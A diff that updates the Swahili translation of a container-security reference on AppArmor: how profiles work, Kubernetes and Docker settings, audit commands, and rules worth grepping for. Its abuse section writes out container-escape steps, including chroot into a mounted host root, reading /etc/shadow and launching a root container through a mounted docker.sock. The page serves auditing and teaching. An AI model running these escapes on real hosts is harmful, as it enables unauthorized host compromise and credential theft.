@@ -4,49 +4,56 @@
 
 ## Muhtasari
 
-AppArmor ni mfumo wa **Mandatory Access Control** unaotumia vizuizi kupitia profiles za kila program. Tofauti na ukaguzi wa kawaida wa DAC, ambao hutegemea sana ownership ya user na group, AppArmor huwezesha kernel kutekeleza policy iliyounganishwa moja kwa moja na process. Katika mazingira ya container, hili ni muhimu kwa sababu workload inaweza kuwa na privilege ya kawaida ya kutosha kujaribu kitendo fulani, lakini bado ikazuiwa kwa sababu AppArmor profile yake hairuhusu path, mount, tabia ya network, au matumizi ya capability husika.
+AppArmor ni mfumo wa **Mandatory Access Control** unaoweka vizuizi kupitia profaili za kila programu. Tofauti na ukaguzi wa kawaida wa DAC, unaotegemea sana umiliki wa mtumiaji na kikundi, AppArmor huruhusu kernel kutekeleza sera inayohusishwa moja kwa moja na mchakato. Katika mazingira ya container, hili ni muhimu kwa sababu workload inaweza kuwa na ruhusa za kawaida zinazotosha kujaribu kitendo fulani, lakini bado ikazuiwa kwa kuwa profaili yake ya AppArmor hairuhusu njia husika, mount, tabia ya mtandao au matumizi ya uwezo.
 
-Jambo muhimu zaidi la kimawazo ni kwamba AppArmor ni **path-based**. Huchanganua ufikiaji wa filesystem kupitia path rules badala ya labels kama SELinux. Hilo huifanya iwe rahisi kueleweka na yenye nguvu, lakini pia linamaanisha kuwa bind mounts na miundo mbadala ya path zinahitaji uangalifu mkubwa. Ikiwa content ileile ya host inaweza kufikiwa kupitia path tofauti, athari ya policy inaweza isiwe ile ambayo operator alitarajia mwanzoni.
+Jambo muhimu zaidi la kuelewa ni kwamba AppArmor hutegemea njia (path-based). Huchanganua ufikiaji wa mfumo wa faili kwa kutumia sheria za njia, badala ya lebo kama SELinux. Hilo hurahisisha matumizi yake na kuifanya iwe na nguvu, lakini pia humaanisha kwamba bind mounts na mpangilio mbadala wa njia vinahitaji kuzingatiwa kwa makini. Ikiwa maudhui yale yale ya host yanaweza kufikiwa kupitia njia tofauti, sera inaweza kuwa na matokeo tofauti na yale ambayo mwendeshaji alitarajia mwanzoni.
 
-## Jukumu Katika Kutenga Container
+## Nafasi Yake Katika Kutenga Container
 
-Ukaguzi wa usalama wa container mara nyingi huishia kwenye capabilities na seccomp, lakini AppArmor bado ina umuhimu baada ya ukaguzi huo. Fikiria container yenye privilege zaidi ya inavyopaswa kuwa, au workload iliyohitaji capability moja ya ziada kwa sababu za uendeshaji. AppArmor bado inaweza kuzuia file access, mount behavior, networking, na execution patterns kwa njia zinazozuia abuse path iliyo wazi. Ndiyo maana kuzima AppArmor "ili tu application ifanye kazi" kunaweza kubadilisha kimyakimya configuration iliyo hatarishi tu kuwa configuration inayoweza kutumiwa vibaya moja kwa moja.
+Ukaguzi wa usalama wa container mara nyingi huishia kwenye capabilities na seccomp, lakini AppArmor huendelea kuwa muhimu hata baada ya ukaguzi huo. Fikiria container yenye ruhusa nyingi kuliko inavyopaswa kuwa nazo, au workload iliyohitaji capability moja ya ziada kwa sababu za kiutendaji. AppArmor bado inaweza kuzuia ufikiaji wa faili, tabia ya mount, mitandao na mifumo ya utekelezaji kwa njia zinazozuia matumizi mabaya yaliyo wazi. Ndiyo maana kuzima AppArmor “ili tu programu ifanye kazi” kunaweza kubadilisha kimyakimya usanidi ulio hatarishi tu kuwa unaoweza kutumiwa vibaya moja kwa moja.
 
 ## Maabara
 
-Ili kuangalia ikiwa AppArmor iko active kwenye host, tumia:
+Ili kuangalia kama AppArmor inatumika kwenye host, tumia:
+
 ```bash
 aa-status 2>/dev/null || apparmor_status 2>/dev/null
 cat /sys/module/apparmor/parameters/enabled 2>/dev/null
 ```
-Ili kuona mchakato wa sasa wa container unaendeshwa chini ya:
+
+Ili kuona mchakato wa sasa wa container unaendeshwa chini ya nini:
+
 ```bash
 docker run --rm ubuntu:24.04 cat /proc/self/attr/current
 docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
 ```
-Tofauti hiyo ni ya kufundisha. Katika hali ya kawaida, mchakato unapaswa kuonyesha muktadha wa AppArmor unaohusishwa na profile iliyochaguliwa na runtime. Katika hali ya unconfined, safu hiyo ya ziada ya vizuizi huondolewa.
 
-Unaweza pia kukagua kile ambacho Docker inaamini kuwa ilitumia:
+Tofauti hii inafundisha. Katika hali ya kawaida, mchakato unapaswa kuonyesha muktadha wa AppArmor unaohusishwa na profile iliyochaguliwa na runtime. Katika hali isiyozuiwa, safu hiyo ya ziada ya vizuizi hutoweka.
+
+Unaweza pia kukagua kile ambacho Docker inadhani imetumia:
+
 ```bash
 docker inspect <container> | jq '.[0].AppArmorProfile'
 ```
-## Matumizi ya Wakati wa Kuendesha
 
-Docker inaweza kutumia AppArmor profile ya msingi au custom pale host inapoiunga mkono. Podman pia inaweza kuunganishwa na AppArmor kwenye mifumo inayotumia AppArmor, ingawa kwenye distributions zinazotanguliza SELinux, mfumo mwingine wa MAC mara nyingi huwa ndio unaotumika zaidi. Kubernetes inaweza kuweka sera ya AppArmor katika kiwango cha workload kwenye nodes zinazoiunga mkono AppArmor. LXC na mazingira yanayohusiana ya system-container ya familia ya Ubuntu pia hutumia AppArmor kwa kiwango kikubwa.
+## Matumizi ya Runtime
 
-Jambo la msingi ni kwamba AppArmor si "Docker feature". Ni host-kernel feature ambayo runtimes kadhaa zinaweza kuchagua kutumia. Ikiwa host haiiungi mkono au runtime imeagizwa iendeshe bila ulinzi (`unconfined`), ulinzi unaodhaniwa haupo kwa kweli.
+Docker inaweza kutumia profile ya AppArmor ya kawaida au maalum ikiwa host inaiunga mkono. Podman pia inaweza kuunganishwa na AppArmor kwenye mifumo inayotumia AppArmor, ingawa kwenye distributions zinazotanguliza SELinux, mfumo huo mwingine wa MAC mara nyingi huwa ndio unaotumika zaidi. Kubernetes inaweza kuwezesha sera za AppArmor katika kiwango cha workload kwenye nodes zinazoiunga mkono. LXC na mazingira mengine yanayohusiana ya system-container katika familia ya Ubuntu pia hutumia AppArmor kwa kiwango kikubwa.
 
-Kwa Kubernetes hasa, API ya kisasa ni `securityContext.appArmorProfile`. Tangu Kubernetes `v1.30`, AppArmor annotations za zamani za beta zimewekewa alama ya deprecated. Kwenye hosts zinazotumika, `RuntimeDefault` ndiyo profile ya msingi, huku `Localhost` ikirejelea profile ambayo lazima iwe tayari imepakiwa kwenye node. Hili ni muhimu wakati wa ukaguzi kwa sababu manifest inaweza kuonekana kuwa inafahamu AppArmor, lakini bado ikategemea kabisa support ya node na profiles zilizopakiwa awali.<sup>[[1]](#references)</sup>
+Jambo la msingi ni kwamba AppArmor si "kipengele cha Docker". Ni kipengele cha kernel ya host ambacho runtimes kadhaa zinaweza kuchagua kutumia. Ikiwa host haiiungi mkono au runtime imeelekezwa kuendesha bila vizuizi, ulinzi unaodhaniwa haupo kweli.
 
-Jambo moja dogo lakini muhimu kiutendaji ni kwamba kuweka wazi `appArmorProfile.type: RuntimeDefault` ni kali zaidi kuliko kuacha field hiyo bila kuwekwa. Ikiwa field imewekwa wazi na node haiungi mkono AppArmor, admission inapaswa kushindwa. Ikiwa field imeachwa bila kuwekwa, workload bado inaweza kuendeshwa kwenye node isiyokuwa na AppArmor na isiweze tu kupata layer hiyo ya ziada ya confinement. Kwa mtazamo wa attacker, hii ni sababu nzuri ya kukagua manifest pamoja na hali halisi ya node.<sup>[[1]](#references)</sup>
+Kwa Kubernetes hasa, API ya kisasa ni `securityContext.appArmorProfile`. Tangu Kubernetes `v1.30`, AppArmor annotations za zamani za beta zimeacha kupendekezwa. Kwenye hosts zinazotumika, `RuntimeDefault` ndiyo profile ya kawaida, huku `Localhost` ikielekeza kwenye profile ambayo lazima iwe tayari imepakiwa kwenye node. Hili ni muhimu wakati wa ukaguzi kwa sababu manifest inaweza kuonekana kuwa inatumia AppArmor, ilhali bado inategemea kabisa usaidizi wa upande wa node na profiles zilizopakiwa awali.<sup>[[1]](#references)</sup>
 
-Kwenye hosts za AppArmor zinazoweza kuendesha Docker, default inayojulikana zaidi ni `docker-default`. Profile hiyo hutengenezwa kutoka kwenye AppArmor template ya Moby na ni muhimu kwa sababu inaeleza kwa nini baadhi ya capability-based PoCs bado hushindwa kwenye container ya kawaida. Kwa ujumla, `docker-default` inaruhusu networking ya kawaida, inazuia writes kwenye sehemu kubwa ya `/proc`, inazuia access kwenye sehemu nyeti za `/sys`, inazuia mount operations, na inawekea ptrace mipaka ili isiwe primitive ya jumla ya kuchunguza host. Kuelewa baseline hiyo husaidia kutofautisha kati ya "container ina `CAP_SYS_ADMIN`" na "container inaweza kweli kutumia capability hiyo dhidi ya kernel interfaces ninazozihitaji".
+Jambo moja dogo lakini muhimu kiutendaji ni kwamba kuweka wazi `appArmorProfile.type: RuntimeDefault` kuna masharti makali zaidi kuliko kuacha sehemu hiyo bila kuwekwa. Ikiwa sehemu hiyo imewekwa wazi na node haiungi mkono AppArmor, admission inapaswa kushindwa. Ikiwa sehemu hiyo haijawekwa, workload bado inaweza kuendeshwa kwenye node isiyo na AppArmor bila kupata safu hiyo ya ziada ya vizuizi. Kwa mtazamo wa mshambuliaji, hii ni sababu nzuri ya kukagua manifest na hali halisi ya node.<sup>[[1]](#references)</sup>
 
-## Usimamizi wa Profile
+Kwenye hosts za AppArmor zinazotumia Docker, profile ya kawaida inayojulikana zaidi ni `docker-default`. Profile hiyo hutengenezwa kutoka kwenye template ya AppArmor ya Moby, na ni muhimu kwa sababu inaeleza kwa nini baadhi ya PoCs zinazotegemea capabilities bado hushindwa ndani ya container ya kawaida. Kwa ujumla, `docker-default` huruhusu matumizi ya kawaida ya mtandao, huzuia uandishi katika sehemu kubwa ya `/proc`, huzuia ufikiaji wa sehemu nyeti za `/sys`, huzuia mount operations, na huzuia ptrace ili isitumike kama njia ya jumla ya kuchunguza host. Kuelewa kiwango hicho cha msingi husaidia kutofautisha kati ya "container ina `CAP_SYS_ADMIN`" na "container inaweza kweli kutumia capability hiyo dhidi ya interfaces za kernel ninazozijali".
 
-AppArmor profiles kwa kawaida huhifadhiwa chini ya `/etc/apparmor.d/`. Kanuni ya kawaida ya kutaja majina ni kubadilisha slashes kwenye executable path kuwa dots. Kwa mfano, profile ya `/usr/bin/man` kwa kawaida huhifadhiwa kama `/etc/apparmor.d/usr.bin.man`. Maelezo haya ni muhimu wakati wa defense na assessment kwa sababu ukishajua jina la active profile, mara nyingi unaweza kupata faili inayolingana haraka kwenye host.
+## Usimamizi wa Profiles
 
-Useful host-side management commands include:
+Profiles za AppArmor kwa kawaida huhifadhiwa chini ya `/etc/apparmor.d/`. Kanuni ya kawaida ya kutaja majina ni kubadilisha slashes kwenye njia ya executable kuwa nukta. Kwa mfano, profile ya `/usr/bin/man` kwa kawaida huhifadhiwa kama `/etc/apparmor.d/usr.bin.man`. Jambo hili ni muhimu katika ulinzi na tathmini kwa sababu ukishajua jina la profile inayotumika, mara nyingi unaweza kuipata faili inayolingana haraka kwenye host.
+
+Amri muhimu za usimamizi kwenye host ni pamoja na:
+
 ```bash
 aa-status
 aa-enforce
@@ -56,74 +63,90 @@ aa-genprof
 aa-logprof
 aa-mergeprof
 ```
-Sababu ya amri hizi kuwa muhimu katika reference ya container-security ni kwamba zinaeleza jinsi profiles zinavyoundwa, kupakiwa, kuhamishiwa kwenye complain mode, na kurekebishwa baada ya mabadiliko ya application. Ikiwa operator ana mazoea ya kuhamisha profiles kwenye complain mode wakati wa troubleshooting na kusahau kurejesha enforcement, container inaweza kuonekana kuwa imelindwa kwenye documentation huku ikifanya kazi kwa ulegevu zaidi katika uhalisia.
 
-### Kujenga Na Kusasisha Profiles
+Sababu inayofanya amri hizi ziwe muhimu katika mwongozo wa usalama wa kontena ni kwamba zinaeleza jinsi profaili zinavyoundwa, kupakiwa, kubadilishwa kuwa complain mode, na kurekebishwa baada ya mabadiliko ya programu. Ikiwa opereta ana mazoea ya kubadilisha profaili ziwe complain mode wakati wa kutatua matatizo na kusahau kurejesha enforcement, kontena linaweza kuonekana kuwa limelindwa kwenye nyaraka huku kiuhalisia likiwa na vizuizi vichache zaidi.
 
-`aa-genprof` inaweza kufuatilia tabia ya application na kusaidia kutengeneza profile kwa njia ya interactive:
+### Kuunda Na Kusasisha Profaili
+
+`aa-genprof` inaweza kufuatilia tabia ya programu na kusaidia kuunda profaili kwa maingiliano:
+
 ```bash
 sudo aa-genprof /path/to/binary
 /path/to/binary
 ```
-`aa-easyprof` inaweza kutengeneza template profile ambayo baadaye inaweza kupakiwa kwa `apparmor_parser`:
+
+`aa-easyprof` inaweza kutengeneza wasifu wa kiolezo ambao unaweza kupakiwa baadaye kwa kutumia `apparmor_parser`:
+
 ```bash
 sudo aa-easyprof /path/to/binary
 sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
 ```
-Wakati binary inabadilika na policy inahitaji kusasishwa, `aa-logprof` inaweza kurudia denial zilizopatikana kwenye logs na kumsaidia operator kuamua kuziruhusu au kuzikataa:
+
+Wakati binary inabadilika na sera inahitaji kusasishwa, `aa-logprof` inaweza kucheza tena vizuizi vilivyopatikana kwenye logs na kumsaidia mwendeshaji kuamua kuviruhusu au kuvizuia:
+
 ```bash
 sudo aa-logprof
 ```
-### Logs
 
-Kukataliwa kwa AppArmor mara nyingi huonekana kupitia `auditd`, syslog, au tools kama vile `aa-notify`:
+### Kumbukumbu
+
+Kukatazwa kwa AppArmor mara nyingi huonekana kupitia `auditd`, syslog, au zana kama `aa-notify`:
+
 ```bash
 sudo aa-notify -s 1 -v
 ```
-Hii ni muhimu kwa matumizi ya kiutendaji na ya ki-offensive. Defenders huitumia kuboresha profiles. Attackers huitumia kujifunza ni path au operation gani hasa inayozuiwa na kama AppArmor ndiyo control inayozuia exploit chain.
 
-### Kutambua Faili Halisi la Profile
+Hili ni muhimu katika shughuli za kiutendaji na kwa mashambulizi. Watetezi hutumia hili kuboresha profiles. Washambuliaji hutumia hili kujua njia au operesheni mahususi inayozuiwa na kama AppArmor ndiyo udhibiti unaozuia msururu wa exploit.
 
-Wakati runtime inaonyesha jina mahususi la AppArmor profile kwa container, mara nyingi ni muhimu kuhusianisha jina hilo na profile file iliyo kwenye disk:
+### Kutambua Faili Mahususi ya Profile
+
+Runtime inapoonyesha jina mahususi la AppArmor profile kwa container, mara nyingi ni muhimu kuoanisha jina hilo na faili ya profile iliyo kwenye diski:
+
 ```bash
 docker inspect <container> | grep AppArmorProfile
 find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
 ```
-Hii ni muhimu hasa wakati wa ukaguzi wa upande wa host kwa sababu inaunganisha pengo kati ya "container inasema inaendeshwa chini ya profile `lowpriv`" na "rules halisi ziko kwenye file hii mahususi ambayo inaweza kukaguliwa au kupakiwa upya".
 
-### Rules Zenye Signal Kubwa za Kukagua
+Hili ni muhimu hasa wakati wa ukaguzi upande wa host kwa sababu linaunganisha pengo kati ya "container inasema inaendeshwa chini ya profile `lowpriv`" na "sheria halisi ziko kwenye faili hii mahususi inayoweza kukaguliwa au kupakiwa upya".
 
-Unapoweza kusoma profile, usiishie kwenye mistari rahisi ya `deny`. Aina kadhaa za rules hubadilisha kwa kiasi kikubwa jinsi AppArmor itakavyokuwa na manufaa dhidi ya jaribio la container escape:<sup>[[2]](#references)</sup>
+### Sheria Muhimu Za Kukagua
 
-- `ux` / `Ux`: huendesha target binary bila confinement. Ikiwa helper, shell, au interpreter inayoweza kufikiwa inaruhusiwa chini ya `ux`, kwa kawaida hilo ndilo jambo la kwanza la kutest.
-- `px` / `Px` na `cx` / `Cx`: hufanya profile transitions wakati wa exec. Hizi si mbaya moja kwa moja, lakini zinafaa kukaguliwa kwa sababu transition inaweza kufikisha kwenye profile pana zaidi kuliko ya sasa.
-- `change_profile`: huruhusu task kubadilisha na kuingia kwenye profile nyingine iliyopakiwa, mara moja au wakati wa exec inayofuata. Ikiwa destination profile ni dhaifu zaidi, hii inaweza kuwa escape hatch iliyokusudiwa kutoka kwenye domain yenye restrictions.
-- `flags=(complain)`, `flags=(unconfined)`, au `flags=(prompt)` mpya zaidi: hizi zinapaswa kubadilisha kiwango cha trust unachoweka kwenye profile. `complain` hu-log denials badala ya kuzitekeleza, `unconfined` huondoa boundary, na `prompt` hutegemea userspace decision path badala ya deny inayotekelezwa moja kwa moja na kernel.
-- `userns` au `userns create,`: AppArmor policy mpya zaidi inaweza kudhibiti uundaji wa user namespaces. Ikiwa container profile inairuhusu waziwazi, nested user namespaces bado zinaendelea kuwepo hata wakati platform inatumia AppArmor kama sehemu ya hardening strategy.
+Unapoweza kusoma profile, usiishie kwenye mistari rahisi ya `deny`. Aina kadhaa za sheria hubadilisha kwa kiasi kikubwa jinsi AppArmor itakavyokuwa na manufaa dhidi ya jaribio la kutoroka kwenye container:<sup>[[2]](#references)</sup>
+
+- `ux` / `Ux`: tekeleza binary lengwa bila vizuizi. Ikiwa helper, shell, au interpreter inayoweza kufikiwa inaruhusiwa chini ya `ux`, kwa kawaida hilo ndilo jambo la kwanza la kujaribu.
+- `px` / `Px` na `cx` / `Cx`: badilisha profile wakati wa exec. Hizi si mbaya moja kwa moja, lakini zinafaa kukaguliwa kwa sababu mabadiliko yanaweza kupeleka kwenye profile pana zaidi kuliko ya sasa.
+- `change_profile`: huruhusu task kubadili na kuingia kwenye profile nyingine iliyopakiwa, mara moja au wakati wa exec inayofuata. Ikiwa profile lengwa ina vizuizi vichache zaidi, hili linaweza kuwa njia iliyokusudiwa ya kutoroka kutoka kwenye domain yenye vizuizi vikali.
+- `flags=(complain)`, `flags=(unconfined)`, au `flags=(prompt)` mpya zaidi: hizi zinapaswa kubadilisha kiwango cha uaminifu unachoiweka kwenye profile. `complain` huandika denials kwenye log badala ya kuzitekeleza, `unconfined` huondoa mpaka wa usalama, na `prompt` hutegemea njia ya uamuzi ya userspace badala ya deny inayotekelezwa na kernel pekee.
+- `userns` au `userns create,`: sera mpya zaidi za AppArmor zinaweza kudhibiti uundaji wa user namespace. Ikiwa profile ya container inaruhusu hili waziwazi, user namespace zilizoundwa ndani yake bado zinawezekana hata pale ambapo platform hutumia AppArmor kama sehemu ya mkakati wake wa kuimarisha usalama.
 
 Grep muhimu upande wa host:
+
 ```bash
 grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
 ```
-Aina hii ya ukaguzi mara nyingi huwa na manufaa zaidi kuliko kuchunguza mamia ya sheria za kawaida za faili. Ikiwa breakout inategemea kutekeleza helper, kuingia kwenye namespace mpya, au kutoroka kwenda kwenye profile yenye vizuizi vichache, jibu mara nyingi limefichwa katika sheria hizi zinazoelekeza mabadiliko badala ya mistari iliyo wazi ya mtindo wa `deny /etc/shadow r`.
 
-## Misconfigurations
+Ukaguzi wa aina hii mara nyingi huwa na manufaa zaidi kuliko kuchunguza mamia ya sheria za kawaida za faili. Ikiwa breakout inategemea kutekeleza helper, kuingia kwenye namespace mpya, au kutorokea profile yenye vizuizi vichache zaidi, jibu mara nyingi huwa limefichwa katika sheria hizi zinazohusu transitions badala ya mistari inayoonekana wazi kama `deny /etc/shadow r`.
 
-Kosa lililo wazi zaidi ni `apparmor=unconfined`. Mara nyingi administrators huiweka wakati wa kufanya debugging ya application iliyoshindwa kwa sababu profile ilizuia kwa usahihi kitu hatari au kisichotarajiwa. Ikiwa flag hiyo itabaki production, safu nzima ya MAC itakuwa imeondolewa kwa ufanisi.
+## Mipangilio Isiyo Sahihi
 
-Tatizo jingine lisilo dhahiri ni kudhani kwamba bind mounts hazina madhara kwa sababu file permissions zinaonekana kuwa za kawaida. Kwa kuwa AppArmor inategemea paths, kuonyesha host paths chini ya alternate mount locations kunaweza kuingiliana vibaya na path rules. Kosa la tatu ni kusahau kwamba jina la profile katika config file lina maana ndogo sana ikiwa host kernel hailazimishi AppArmor kwa kweli.
+Kosa lililo wazi zaidi ni `apparmor=unconfined`. Wasimamizi mara nyingi huiweka wakati wa kutatua hitilafu ya programu iliyosababishwa na profile kuzuia kwa usahihi kitu hatari au kisichotarajiwa. Ikiwa flag hii itabaki kwenye production, safu nzima ya MAC huwa imeondolewa kwa vitendo.
 
-## Abuse
+Tatizo jingine lisilo dhahiri sana ni kudhani kwamba bind mounts hazina madhara kwa sababu ruhusa za faili zinaonekana za kawaida. Kwa kuwa AppArmor hutegemea njia, kufichua njia za host chini ya maeneo mbadala ya mount kunaweza kuingiliana vibaya na sheria za njia. Kosa la tatu ni kusahau kwamba jina la profile katika faili ya config halina maana kubwa ikiwa kernel ya host hailazimishi AppArmor kutekelezwa.
 
-AppArmor ikiwa haipo, operations zilizokuwa zimewekewa vizuizi zinaweza kufanya kazi ghafla: kusoma sensitive paths kupitia bind mounts, kufikia sehemu za procfs au sysfs ambazo zilipaswa kubaki ngumu zaidi kutumia, kutekeleza mount-related actions ikiwa capabilities/seccomp pia zinaruhusu, au kutumia paths ambazo profile kwa kawaida ingekataa. AppArmor mara nyingi ndiyo mechanism inayoeleza kwa nini jaribio la capability-based breakout "should work" kinadharia lakini bado linashindwa kwa vitendo. Ondoa AppArmor, na jaribio hilo hilo linaweza kuanza kufanikiwa.
+## Matumizi Mabaya
 
-Ikiwa unashuku kwamba AppArmor ndiyo kitu kikuu kinachozuia path-traversal, bind-mount, au mount-based abuse chain, hatua ya kwanza kwa kawaida ni kulinganisha kile kinachoweza kufikiwa ukiwa na profile na bila profile. Kwa mfano, ikiwa host path imewekwa ndani ya container, anza kwa kuangalia ikiwa unaweza kuipitia na kuisoma:
+AppArmor isipokuwepo, shughuli zilizokuwa zimewekewa vizuizi zinaweza kuanza kufanya kazi: kusoma njia nyeti kupitia bind mounts, kufikia sehemu za procfs au sysfs ambazo zilipaswa kuwa ngumu zaidi kutumia, kutekeleza shughuli zinazohusiana na mount ikiwa capabilities/seccomp pia zinaruhusu, au kutumia njia ambazo profile kwa kawaida ingekataa. AppArmor mara nyingi ndiyo hufafanua kwa nini jaribio la breakout linalotegemea capability "linapaswa kufanya kazi" kinadharia lakini bado linashindwa kwa vitendo. Ondoa AppArmor, na jaribio hilohilo linaweza kuanza kufanikiwa.
+
+Ikiwa unashuku kuwa AppArmor ndiyo kizuizi kikuu cha mnyororo wa matumizi mabaya unaotegemea path-traversal, bind-mount, au mount, hatua ya kwanza kwa kawaida ni kulinganisha kinachoweza kufikiwa ukiwa na profile na bila profile. Kwa mfano, ikiwa njia ya host imewekwa ndani ya container, anza kwa kuangalia kama unaweza kuipitia na kuisoma:
+
 ```bash
 cat /proc/self/attr/current
 find /host -maxdepth 2 -ls 2>/dev/null | head
 find /host/etc -maxdepth 1 -type f 2>/dev/null | head
 ```
-Ikiwa container pia ina capability hatari kama `CAP_SYS_ADMIN`, mojawapo ya majaribio ya vitendo zaidi ni kubaini ikiwa AppArmor ndiyo control inayozuia mount operations au ufikiaji wa kernel filesystems nyeti:
+
+Ikiwa container pia ina capability hatari kama `CAP_SYS_ADMIN`, mojawapo ya majaribio ya vitendo zaidi ni kubaini kama AppArmor ndiyo udhibiti unaozuia shughuli za mount au ufikiaji wa filesystems nyeti za kernel:
+
 ```bash
 capsh --print | grep cap_sys_admin
 mount | head
@@ -131,50 +154,62 @@ mkdir -p /tmp/testmnt
 mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
 mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
 ```
-Katika mazingira ambapo path ya host tayari inapatikana kupitia bind mount, kupoteza AppArmor kunaweza pia kubadilisha tatizo la information disclosure la read-only kuwa ufikiaji wa moja kwa moja wa mafaili ya host:
+
+Katika mazingira ambamo njia ya host tayari inapatikana kupitia bind mount, kupoteza AppArmor kunaweza pia kubadilisha tatizo la ufichuaji wa taarifa za kusoma pekee kuwa ufikiaji wa moja kwa moja wa faili za host:
+
 ```bash
 ls -la /host/root 2>/dev/null
 cat /host/etc/shadow 2>/dev/null | head
 find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
 ```
-Lengo la commands hizi si kwamba AppArmor peke yake huunda breakout. Ni kwamba baada ya AppArmor kuondolewa, abuse paths nyingi za filesystem na mount zinaweza kujaribiwa mara moja.
 
-### Mfano Kamili: AppArmor Imezimwa + Host Root Imemountiwa
+Lengo la amri hizi si kwamba AppArmor pekee ndiyo husababisha breakout. Ni kwamba AppArmor ikiondolewa, njia nyingi za kutumia vibaya filesystem na mount zinaweza kujaribiwa mara moja.
 
-Ikiwa container tayari ina host root iliyobind-mountiwa kwenye `/host`, kuondoa AppArmor kunaweza kubadilisha abuse path ya filesystem iliyozuiwa kuwa host escape kamili:
+### Mfano Kamili: AppArmor Imezimwa + Root ya Host Imewekwa Mount
+
+Ikiwa root ya host tayari imewekwa bind-mount kwenye `/host`, kuondoa AppArmor kunaweza kubadilisha njia ya kutumia vibaya filesystem iliyozuiwa na kuwa njia kamili ya kutoroka kutoka kwa host:
+
 ```bash
 cat /proc/self/attr/current
 ls -la /host
 chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
 ```
-Mara tu shell inapotekelezwa kupitia filesystem ya host, workload huwa imevuka kwa ufanisi mpaka wa container:
+
+Mara tu shell inapotekelezwa kupitia mfumo wa faili wa host, workload kwa vitendo imeutoroka mpaka wa container:
+
 ```bash
 id
 hostname
 cat /etc/shadow | head
 ```
+
 ### Mfano Kamili: AppArmor Imezimwa + Runtime Socket
 
-Ikiwa kizuizi halisi kilikuwa AppArmor inayolinda hali ya runtime, socket iliyomountiwa inaweza kutosha kufanikisha escape kamili:
+Ikiwa kizuizi halisi kilikuwa AppArmor inayolinda hali ya runtime, socket iliyomountiwa inaweza kutosha kufanya escape kamili:
+
 ```bash
 find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
 docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
 ```
-Njia kamili inategemea mount point, lakini matokeo ya mwisho ni yale yale: AppArmor haiwezi tena kuzuia access kwa runtime API, na runtime API inaweza kuzindua container inayoweza ku-compromise host.
 
-### Mfano Kamili: Path-Based Bind-Mount Bypass
+Njia halisi hutegemea sehemu ya kupachika, lakini matokeo ni yale yale: AppArmor haizuii tena ufikiaji wa runtime API, na runtime API inaweza kuzindua container inayoweza kuhatarisha host.
 
-Kwa sababu AppArmor inategemea path, kulinda `/proc/**` hakulindi kiotomatiki maudhui yale yale ya host procfs yanapofikiwa kupitia path tofauti:
+### Mfano Kamili: Uepukaji wa Bind-Mount Unaotegemea Njia
+
+Kwa kuwa AppArmor hutegemea njia, kulinda `/proc/**` hakulindi kiotomatiki maudhui yale yale ya procfs ya host yanapofikiwa kupitia njia tofauti:
+
 ```bash
 mount | grep '/host/proc'
 find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
 cat /host/proc/sys/kernel/core_pattern 2>/dev/null
 ```
-Athari inategemea ni nini hasa kime-mountiwa na ikiwa njia mbadala pia inapita controls nyingine, lakini pattern hii ni mojawapo ya sababu zilizo wazi zaidi zinazoonyesha kwamba AppArmor lazima ichunguzwe pamoja na mpangilio wa mount badala ya kuchunguzwa peke yake.
+
+Athari hutegemea kile hasa kilichowekwa kwenye mount na iwapo njia mbadala pia inakwepa vidhibiti vingine, lakini muundo huu ni mojawapo ya sababu zilizo wazi zaidi zinazoonyesha kwamba AppArmor lazima ichunguzwe pamoja na mpangilio wa mount, badala ya kuchunguzwa peke yake.
 
 ### Mfano Kamili: Shebang Bypass
 
-Sera ya AppArmor wakati mwingine hulenga interpreter path kwa namna ambayo haizingatii kikamilifu script execution kupitia ushughulikiaji wa shebang. Mfano wa kihistoria ulihusisha kutumia script ambayo mstari wake wa kwanza unaelekeza kwenye interpreter iliyowekewa confinement:<sup>[[3]](#references)</sup>
+AppArmor inaweza kuhusisha profile na njia ya script inayotekelezwa badala ya interpreter iliyotajwa kwenye shebang yake. Kinyume chake, kumwita interpreter moja kwa moja kunaweza kuchagua profile ya interpreter hiyo. [Msimamizi wa AppArmor anaeleza tofauti hii](https://bugs.launchpad.net/apparmor/+bug/1911431). Mfano wa kihistoria ulihusu script ambayo mstari wake wa kwanza unaelekeza kwenye interpreter yenye vikwazo:
+
 ```bash
 cat <<'EOF' > /tmp/test.pl
 #!/usr/bin/perl
@@ -185,11 +220,13 @@ EOF
 chmod +x /tmp/test.pl
 /tmp/test.pl
 ```
-Aina hii ya mfano ni muhimu kama ukumbusho kwamba nia ya profile na semantics halisi za utekelezaji zinaweza kutofautiana. Wakati wa kukagua AppArmor katika mazingira ya container, minyororo ya interpreters na njia mbadala za utekelezaji zinahitaji uangalifu maalum.
 
-## Ukaguzi
+Mfano huu ni hali inayoweza kuruhusu uwezo wa faili wa interpreter kuanza kutumika na attachment halisi ya exec ya script kuruhusu operesheni hiyo. Kagua policy iliyopakiwa na lebo ya mchakato, capability bounding set, `no_new_privs`, na hali ya `nosuid` ya mount; jina la faili la profile au orodha ya `cap_setuid+ep` pekee hazithibitishi kuwa kuna transition inayoweza kutumika. Mnyororo wa interpreter na njia mbadala za utekelezaji zinahitaji ukaguzi tofauti.
 
-Lengo la ukaguzi huu ni kujibu haraka maswali matatu: je, AppArmor imewezeshwa kwenye host, je, process ya sasa imewekewa vizuizi, na je, runtime ilitumia profile kwenye container hii?
+## Checks
+
+Lengo la ukaguzi huu ni kujibu haraka maswali matatu: je, AppArmor imewezeshwa kwenye host, je, mchakato wa sasa umewekewa confinement, na je, runtime ilitumia profile kwa container hii?
+
 ```bash
 cat /proc/self/attr/current                         # Current AppArmor label for this process
 aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
